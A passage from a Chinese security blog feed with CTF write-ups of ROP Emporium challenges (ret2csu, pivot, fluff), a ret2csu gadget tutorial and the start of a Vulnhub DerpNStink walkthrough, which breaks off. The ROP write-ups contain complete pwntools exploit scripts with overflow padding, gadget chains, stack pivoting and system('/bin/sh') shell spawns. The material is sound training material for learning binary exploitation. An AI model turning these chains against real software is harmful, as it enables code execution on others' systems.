        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><a href="https://ropemporium.com/">ROP Emporium</a>训练7：ret2csu的解析。</p><span id="more"></span><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>程序运行图：</p><p><img src="/img/ret2csu/ret2csu1.png"></p><p>checksec：</p><p><img src="/img/ret2csu/ret2csu2.png"></p><p>根据提示，最终还是要调用ret2win函数，但是对相应寄存器有了一定限制。</p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>把程序丢到hopper中发现pwnme函数中fgets函数存在溢出漏洞：</p><p><img src="/img/ret2csu/ret2csu3.png"></p><p>根据提示我们是需要调用ret2win函数：</p><p><img src="/img/ret2csu/ret2csu4.png"></p><p>并且提示我们需要将低3个参数即rdx寄存器的值置为0xdeadcafebabebeef，但是通过ROPgadget我们并没有找到可以控制rdx寄存器的gadgets：</p><p><img src="/img/ret2csu/ret2csu5.png"></p><p>根据<a href="https://coldwave96.github.io/2020/06/15/Useful-Gadgets/">ret2csu - 万能gadgets</a>我们可以选择利用万能gedgets实现传参：</p><p><img src="/img/ret2csu/ret2csu6.png"></p><p>主要思路和easy_csu差不多，同样通过init_array_start函数的指针来跳过gadget2中的那条call指令。</p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>EXP脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = process(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;ret2csu&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* gadget1 = <span class="number">0x40089a</span></span><br><span class="line">* gadget2 = <span class="number">0x400880</span></span><br><span class="line">* </span><br><span class="line">* init_addr = elf.symbols[<span class="string">&#x27;__init_array_start&#x27;</span>]</span><br><span class="line">* ret2win_addr = elf.symbols[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line">* </span><br><span class="line">* payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>)</span><br><span class="line">* payload += p64(gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(init_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)+ p64(<span class="number">0xdeadcafebabebeef</span>)</span><br><span class="line">* payload += p64(gadget2) + <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line">* payload += p64(ret2win_addr)</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">* sh.sendline(payload)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>EXP脚本运行结果：</p><p><img src="/img/ret2csu/ret2csu7.png"></p><h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><p>至此ROP Emporium的8个训练全部结束，完结，撒花～～</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> ROP Emprium </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2csu - 万能Gadgets</title>
      <link href="/2020/06/15/Useful-Gadgets/"/>
      <url>/2020/06/15/Useful-Gadgets/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>2018年blackhat大会提出了ret2csu，即通过libc_csu_init中两个特殊的gadgets实现64位程序的万能传参。</p><span id="more"></span><p>libc_csu_init函数功能是对libc进行初始化操作，一般程序都会调用libc函数，所以这个函数基本上都存在，故而称为万能gadgets。</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets1.png"></p><p>通过汇编代码可以发现，利用这两个gadgets可以依次实现rbx、rbp、r12、rdx、rsi、edi寄存器的赋值。</p><p>在x86的程序中，函数的前6个参数的赋值是依次通过rdi、rsi、rdx、rcx、r8、r9寄存器实现。所以上面我们控制的寄存器中，r12、rdx、rsi和edi寄存器更加吸引我们的注意力，因为他们分别保存着将要调用的函数的指针的地址、第三个参数、第二个参数和第一个参数。</p><p>而rbx和rbp寄存器我们也不能忽视，他们的值必须分别被置为0和1。因为在gadget2中，最后一个指令<code>call [r12 + rbx*8]</code>，将rbx置0则指令将变成<code>call [r12]</code>，方便传参。此外需要注意的是，r12中设置的应该为要调用的函数的指针的地址，即got地址而不是plt地址。</p><p>因为jne指令与je指令正好相反，只有当零标志ZF&#x3D;0时跳转，ZF&#x3D;1时顺序执行下一条指令，即不相等时转移。前一条指令<code>cmp rbx，rbp</code>中rbx再执行完<code>add rbx，0</code>之后必然值为1。所以为了不跳转，必须将rbp的值也置为1，使得汇编指令能够顺序执行而不是跳转到1110行再次执行call指令，这样可能会造成错误。</p><h2 id="Example：easy-csu"><a href="#Example：easy-csu" class="headerlink" title="Example：easy_csu"></a>Example：easy_csu</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>程序运行截图：</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets2.png"></p><p>checksec：64位程序</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets3.png"></p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>把程序丢到hopper中，发现main函数中read函数存在溢出漏洞：</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets4.png"></p><p>看一下vul函数，发现只要调用vul函数，且将vul函数的第3个参数设为3即可：</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets5.png"></p><p>由于这是64位的程序，所以通过寄存器传参，但是通过ROPgadget并没有发现可以用的gadgets：</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets6.png"></p><p>于是我们就想到万能gadgets：</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets7.png"></p><p>所以可以构造这样一个ROP链：首先跳转到loc_4011fe即gadget1给寄存器赋值，然后ret到gadget2将参数转移到需要的寄存器中去，但是gadget2运行后会再次执行一遍gadget1，这样会使得栈空间提升8*7总共56字节，所以我们还需要padding56个字节，然后才能覆盖ret到需要的地址上去。</p><p>在我们给r12赋值的时候，刚开始的想法是直接填上vul函数的地址。但是根据上面关于ret2csu的介绍，r12中应该置为vul函数指针的地址。所以我们需要找到一个指针，再劫持这个指针指向vul函数……这也太麻烦了，而且这样一来题目的初衷和重心就变了。</p><p>为了解决这个问题，我们选择一个简单的办法。用init_array_start函数的指针来跳过gadget2中的那条call指令。init_array_start函数是ELF程序的一个初始化函数，运行它不会对栈空间造成影响，可以说是用于跳过call指令的最佳选择。</p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>于是最终的EXP就是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = process(<span class="string">&#x27;./easy_csu&#x27;</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;easy_csu&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* gadget1 = <span class="number">0x401202</span></span><br><span class="line">* gadget2 = <span class="number">0x4011e8</span></span><br><span class="line">* </span><br><span class="line">* init_addr = elf.symbols[<span class="string">&#x27;__init_array_start&#x27;</span>]</span><br><span class="line">* vul_addr = elf.symbols[<span class="string">&#x27;vul&#x27;</span>]</span><br><span class="line">* </span><br><span class="line">* payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>)</span><br><span class="line">* payload += p64(gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(init_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)+ p64(<span class="number">3</span>)</span><br><span class="line">* payload += p64(gadget2) + <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line">* payload += p64(vul_addr)</span><br><span class="line">* </span><br><span class="line">* sh.sendline(payload)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>EXP运行结果图：</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets8.png"></p>]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> Assembler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP Emporium の pivot</title>
      <link href="/2020/06/11/pivot/"/>
      <url>/2020/06/11/pivot/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><a href="https://ropemporium.com/">ROP Emporium</a>训练6：pivot的解析。</p><span id="more"></span><h2 id="pivot32"><a href="#pivot32" class="headerlink" title="pivot32"></a>pivot32</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>程序正常运行截图：</p><p><img src="/img/pivot/pivot1.png"></p><p>发现可能存在内存地址泄露，加上题目给了libc.so文件，猜测可能需要用到ret2libc和延迟绑定技术,详细内容可了解<a href="https://coldwave96.github.io/2020/05/19/LazyBinding/">ret2libc &amp;&amp; Lazy Binding</a>。</p><p>checksec：</p><p><img src="/img/pivot/pivot2.png"></p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>pwnme函数中fgets函数存在溢出漏洞，offset为0x28：</p><p><img src="/img/pivot/pivot3.png"></p><p>程序运行时提示我们call ret2win() from libpivot.so，看下这个函数是什么内容：</p><p><img src="/img/pivot/pivot4.png"></p><p>那么直接调用这个函数就行了。但是这个函数在libc.so中，需要通过ret2libc实现函数的调用。首先要选择一个函数同时在pivot程序和libc.so中，泄露其真实地址后通过计算得到libc.so加载的基址，加上ret2win函数在libc.so中的offset，直接定位ret2win函数在内存中的真实地址。</p><p>通过比对发现，我们只能选择foothold_function函数来获取libc.so的基址：</p><p><img src="/img/pivot/pivot5.png"></p><p><img src="/img/pivot/pivot6.png"></p><p>这时我们会发现pwnme函数中fgets只有0x3a Bytes缓冲区的长度，并不足以存放我们的shellcode，所以需要另找一个位置存放shellcode。</p><p><img src="/img/pivot/pivot7.png"></p><p>好在程序给了我们一块0x100的堆空间，且具体的内存地址也告诉我们，但是我们需要考虑如何把shellcode写到给的地址上去。</p><p><img src="/img/pivot/pivot8.png"></p><p>通过上面的几个函数就可以实现将shellcode写到指定的内存地址。</p><p>到此，思路就比较清楚了：第一步先将shellcode写到指定内存地址，第二步利用溢出漏洞使程序跳转到shellcode执行。</p><p>第一步中通过sub_80488c4函数写入，通过sub_80488c0函数控制eax寄存器。为了将栈转移到我们需要的地址，需要通过sub_80488c2控制esp寄存器。在找到libc.so的加载基址后，需要通过sub_80488c7函数将基址加上offset找到ret2win函数在内存中的真实地址。所以我们还需要找到控制ebx寄存器的指令：</p><p><img src="/img/pivot/pivot9.png"></p><p>第二步中我们还需要一条指令在覆盖fgets函数返回地址后使得程序能够跳转到我们设定的内存地址执行shellcode，由于我们通过sub_80488c4函数将地址写到了eax寄存器中，所以我们需要控制程序跳转的eax寄存器指向的地址：</p><p><img src="/img/pivot/pivot10.png"></p><p>这样一切准备工作就完成了。</p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>下面就是EXP的编写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">* <span class="comment"># coding:utf-8</span></span><br><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = process(<span class="string">&#x27;./pivot32&#x27;</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;./pivot32&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* libc = ELF(<span class="string">&#x27;./libpivot32.so&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* foothold_function_got = elf.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">* foothold_function_plt = elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">* foothold_function_libc = libc.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">* ret2win_libc = libc.symbols[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;pivot: &#x27;</span>)</span><br><span class="line">* shellcode_addr = <span class="built_in">int</span>(sh.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">* </span><br><span class="line">* pop_eax_addr = <span class="number">0x80488c0</span></span><br><span class="line">* xchg_addr = <span class="number">0x080488c2</span></span><br><span class="line">* mov_addr = <span class="number">0x080488c4</span></span><br><span class="line">* add_addr = <span class="number">0x080488c7</span></span><br><span class="line">* </span><br><span class="line">* pop_ebx_addr = <span class="number">0x08048571</span></span><br><span class="line">* jmp_addr = <span class="number">0x08048a5f</span></span><br><span class="line">* </span><br><span class="line">* payload1 = p32(foothold_function_plt) <span class="comment"># 调用foothold_function函数，调用时会将foothold_function函数的实际地址写入到GOT表中</span></span><br><span class="line">* payload1 += p32(pop_eax_addr) + p32(foothold_function_got)<span class="comment"># 将foothold_function函数的GOT地址写入eax寄存器</span></span><br><span class="line">* payload1 += p32(mov_addr) <span class="comment"># 将foothold_function函数的GOT地址指向的地址放入eax寄存器，即foothold_function函数在内存中的真实地址</span></span><br><span class="line">* payload1 += p32(pop_ebx_addr) + p32(ret2win_libc - foothold_function_libc) <span class="comment"># 将ret2win函数与foothold_function函数在libc.so文件中的相对偏移放入ebx</span></span><br><span class="line">* payload1 += p32(add_addr) <span class="comment"># foothold_function函数真实地址加上ret2win相对于foothold_function函数的offset即得ret2win函数在内存中的实际地址</span></span><br><span class="line">* payload1 += p32(jmp_addr) <span class="comment"># 使程序跳转到eax中的地址，即泄露的堆空间的入口位置</span></span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">* sh.sendline(payload1)</span><br><span class="line">* </span><br><span class="line">* payload2 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x28</span> + <span class="number">0x4</span>) <span class="comment"># padding</span></span><br><span class="line">* payload2 += p32(pop_eax_addr) + p32(shellcode_addr) <span class="comment"># 堆空间的地址放入eax寄存器</span></span><br><span class="line">* payload2 += p32(xchg_addr) <span class="comment"># 交换eax和esp的值，也就是说程序分配的对空间就被当成栈，交换eax和esp的值，也就是说程序分配的堆空间就被当成栈，ret就会返回到栈顶去执行我们精心设计好的shellcode</span></span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;smash&#x27;</span>)</span><br><span class="line">* sh.sendline(payload2)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><ul><li>脚本运行结果图：</li></ul><p><img src="/img/pivot/pivot11.png"></p><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>64位程序和32位思路一模一样，EXP也基本相同，有兴趣的可以自行尝试。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> ROP Emporium </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP Emporium の fluff</title>
      <link href="/2020/06/10/fluff/"/>
      <url>/2020/06/10/fluff/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><a href="https://ropemporium.com/">ROP Emporium</a>训练5：fluff的解析。</p><span id="more"></span><h2 id="fluff32"><a href="#fluff32" class="headerlink" title="fluff32"></a>fluff32</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>程序正常运行截图：</p><p><img src="/img/fluff/fluff1.png"></p><p>checksec：</p><p><img src="/img/fluff/fluff2.png"></p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>依然是pwnme中fgets函数存在溢出：</p><p><img src="/img/fluff/fluff3.png"></p><p>虽然程序中有system函数，但是没有可利用的字符串：</p><p><img src="/img/fluff/fluff4.png"></p><p>所以需要向内存中写入需要的字符串，再找一下可以实现目标的指令段：</p><p><img src="/img/fluff/fluff5.png"></p><p>也没有可以利用的指令段，似乎陷入死局？</p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>其实还是有一条路可以走的，在<a href="https://coldwave96.github.io/2020/05/20/XMAN-level3/">XMAN level3 の Write-Up</a>中我们通过泄露writes函数在got表上的地址得到libc的基地址，然后通过libc中的字符串getshell。这里我们依然可以使用ret2libc技术，泄露puts函数在got表上的地址，获取libc的基地址，然后用这个基地址加上’&#x2F;bin&#x2F;sh’在libc中的offset，调用system函数getshell。</p><p>但是根据题目的叙述，似乎是在让我们尝试强行写入需要的字符串，那我们只能回到程序，再仔细的找找可用的gadget了。</p><p>不妨逆向思维倒推一下，我们需要写内存的操作，那么肯定要mov [reg]，reg；ret的结构：</p><p><img src="/img/fluff/fluff6.png"></p><p>这个函数是可以实现，首先考虑控制写入的地址，那么往前推我们需要控制ecx寄存器，给ecx赋值：</p><p><img src="/img/fluff/fluff7.png"></p><p>xchg指令是交换两个寄存器的值，那么从上面的函数中截取部分是可以实现给ecx赋值的，但是我们就要改为控制edx寄存器：</p><p><img src="/img/fluff/fluff8.png"></p><ul><li>这段指令会将edx和ebx异或的值放入edx。所以我们需要pop edx；xor ebx，ebx；或者pop ebx；xor edx，edx；（A异或0仍为A）</li></ul><p><img src="/img/fluff/fluff9.png"></p><p>所以还需要pop ebx；ret：</p><p><img src="/img/fluff/fluff10.png"></p><p>完美，前半部分控制内存地址的ropchain已经补充完成。下面是控制字符串的写入，也是从sub_8048692函数开始，倒推需要控制edx。</p><p>依然没有直接pop edx的指令，只能选择间接的xor edx，ebx；</p><p>和上面一样需要pop edx；xor ebx，ebx；或者pop ebx；xor edx，edx；</p><p>于是回到上面的sub_8048670函数，最后依然是pop ebx；ret；</p><p>最终实现控制写入的字符串，下面做一个草图帮助一下理解以及EXP的编写：</p><p><img src="/img/fluff/fluff11.png"></p><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><p>最后就是EXP的编写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = process(<span class="string">&#x27;./fluff32&#x27;</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;./fluff32&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* pop_ebx_addr = <span class="number">0x080483e1</span></span><br><span class="line">* xor_edx_edx_addr = <span class="number">0x08048671</span></span><br><span class="line">* xor_edx_ebx_addr = <span class="number">0x0804867b</span></span><br><span class="line">* xchg_addr = <span class="number">0x08048689</span></span><br><span class="line">* mov_addr = <span class="number">0x08048693</span></span><br><span class="line">* </span><br><span class="line">* bss_addr = <span class="number">0x0804a040</span></span><br><span class="line">* sys_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">* </span><br><span class="line">* <span class="keyword">def</span> <span class="title function_">mov_data</span>(<span class="params">string, addr</span>):</span><br><span class="line">*     payload = p32(pop_ebx_addr) + p32(addr)</span><br><span class="line">*     payload += p32(xor_edx_edx_addr) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">*     payload += p32(xor_edx_ebx_addr) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">*     payload += p32(xchg_addr) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">*     payload += p32(pop_ebx_addr) + string</span><br><span class="line">*     payload += p32(xor_edx_edx_addr) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">*     payload += p32(xor_edx_ebx_addr) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">*     payload += p32(mov_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0</span>)</span><br><span class="line">*     <span class="keyword">return</span> payload</span><br><span class="line">* </span><br><span class="line">* payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x28</span> + <span class="number">0x4</span>)</span><br><span class="line">* payload += mov_data(<span class="string">&#x27;/bin&#x27;</span>, bss_addr)</span><br><span class="line">* payload += mov_data(<span class="string">&#x27;/sh\x00&#x27;</span>, bss_addr + <span class="number">4</span>)</span><br><span class="line">* payload += p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bss_addr)</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">* sh.sendline(payload)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>EXP运行结果：</p><p><img src="/img/fluff/fluff12.png"></p><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>像32位程序一样寻找完整的ROP Chain：</p><p><img src="/img/fluff/fluff13.png"></p><p>加上控制r12寄存器的指令段：</p><p><img src="/img/fluff/fluff14.png"></p><p>以及调用system函数传参的时候需要控制rdi寄存器：</p><p><img src="/img/fluff/fluff15.png"></p><p>万事俱备，直接给出EXP脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = process(<span class="string">&#x27;./fluff&#x27;</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;./fluff&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* bss_addr = <span class="number">0x601060</span></span><br><span class="line">* sys_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">* </span><br><span class="line">* mov_addr = <span class="number">0x40084e</span></span><br><span class="line">* xchg_addr = <span class="number">0x400840</span></span><br><span class="line">* xor_r11_r12_addr = <span class="number">0x40082f</span></span><br><span class="line">* xor_r11_r11_addr = <span class="number">0x400822</span></span><br><span class="line">* pop_addr = <span class="number">0x4008bc</span></span><br><span class="line">* </span><br><span class="line">* pop_rdi_addr = <span class="number">0x4008c3</span></span><br><span class="line">* </span><br><span class="line">* payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>)</span><br><span class="line">* payload += p64(pop_addr) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">* payload += p64(xor_r11_r11_addr) + p64(<span class="number">0</span>)</span><br><span class="line">* payload += p64(xor_r11_r12_addr) + p64(<span class="number">0</span>)</span><br><span class="line">* payload += p64(xchg_addr) + p64(<span class="number">0</span>)</span><br><span class="line">* </span><br><span class="line">* payload += p64(pop_addr) + <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">* payload += p64(xor_r11_r11_addr) + p64(<span class="number">0</span>)</span><br><span class="line">* payload += p64(xor_r11_r12_addr) + p64(<span class="number">0</span>)</span><br><span class="line">* payload += p64(mov_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">* </span><br><span class="line">* payload += p64(pop_rdi_addr) + p64(bss_addr)</span><br><span class="line">* </span><br><span class="line">* payload += p64(sys_addr)</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">* sh.sendline(payload)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>EXP运行结果：</p><p><img src="/img/fluff/fluff16.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> ROP Emporium </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - DerpNStink の Write-Up</title>
      <link href="/2020/06/08/DerpNStink/"/>
      <url>/2020/06/08/DerpNStink/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://www.vulnhub.com/">Vulnhub</a>之<a href="https://www.vulnhub.com/entry/derpnstink-1,221/">DerpNStink</a>的Write-up。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>寻找靶机地址：</p><p><img src="/img/DerpNStink/DerpNStink1.png"></p><p>扫描开放的端口和服务：</p><p><img src="/img/DerpNStink/DerpNStink2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>21端口开放了vsftpd服务，之前这个服务是存在远程命令执行漏洞的，不过想要利用这个漏洞需要获得一个账号。</p><p>除此之外还有22端口的ssh服务和80端口的http服务，先从http服务开始：</p><p><img src="/img/DerpNStink/DerpNStink3.png"></p><p>主页比较可爱，查看源码在最下面找到flag1:</p><p><img src="/img/DerpNStink/DerpNStink4.png"></p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>扫描网站目录发现一个比较奇特的地址：</p><p><img src="/img/DerpNStink/DerpNStink5.png"></p><p>访问一下发现下面的界面信息：</p><p><img src="/img/DerpNStink/DerpNStink6.png"></p><p><img src="/img/DerpNStink/DerpNStink7.png"></p><p>根据提示在hosts文件里添加本地dns：<code>172.16.83.139 derpnstink.local</code>。然后再次进行目录爆破：</p><p><img 